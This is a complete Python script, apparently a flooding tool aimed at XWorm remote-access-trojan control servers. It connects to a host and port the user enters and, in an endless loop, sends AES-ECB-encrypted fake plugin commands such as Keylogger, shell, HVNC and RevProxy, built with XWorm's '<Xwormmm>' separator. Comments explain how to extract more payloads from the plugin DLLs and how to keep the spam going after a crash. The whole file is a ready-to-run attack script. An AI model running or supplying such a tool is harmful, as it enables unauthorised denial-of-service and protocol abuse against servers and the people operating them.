
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import hashlib
import random
import socket
import os

class FloodPluginUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = FloodPluginUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class FloodPlugin:
    SPL_XCLIENT = "<Xwormmm>" # Separator constant, used in all XWorm Versions as far as i know

    @staticmethod
    def main():
        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = FloodPlugin.connection(host, port) # Connect to target
        FloodPlugin.trigger(sock, key) # Trigger the Plugin


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(sock, key):
        try:
            plugins = {
                "1": f"Clipboard{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "2": f"FileSeacher{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "3": f"FormHApps{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "4": f"FormHBrowser{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "5": f"hrdp{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "6": f"FormHVNC{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev{FloodPlugin.SPL_XCLIENT}1920{FloodPlugin.SPL_XCLIENT}1080",
                "7": f"Informations{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "8": f"Keylogger{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "9": f"maps{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "10": f"MICCM{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "11": f"Ngrok{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "12": f"PaSTIME{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "13": f"Performance{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev{FloodPlugin.SPL_XCLIENT}CPU Name{FloodPlugin.SPL_XCLIENT}RAM Name{FloodPlugin.SPL_XCLIENT}1{FloodPlugin.SPL_XCLIENT}1{FloodPlugin.SPL_XCLIENT}1{FloodPlugin.SPL_XCLIENT}1",
                "14": f"Programs{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "15": f"Registry{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "16": f"RevProxy{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "17": f"shell{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "18": f"SysSound{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "19": f"TCPConnection{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "22": f"Compiler{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "23": f"VOICECHAT{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "24": f"WBCM{FloodPlugin.SPL_XCLIENT}Webcam Name{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "25": f"ppp{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "26": f"ServiceManager{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
                "27": f"StartupManager{FloodPlugin.SPL_XCLIENT}https://github.com/SwezyDev",
            } # There are probably more Plugins but you get the idea, just open the DLLs in DotPeek or any other decompiler and grab the payload from there
            while True:
                payload = random.choice(list(plugins.values())) # Grab a random plugin payload
                FloodPluginUtils.send_encrypted(sock, payload, key) # Send encrypted message
                print("Plugin opened.") # The connection could crash, so if you want to keep spamming just make a try - except here and reconnect if needed
        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    FloodPlugin.main() # Run the main function 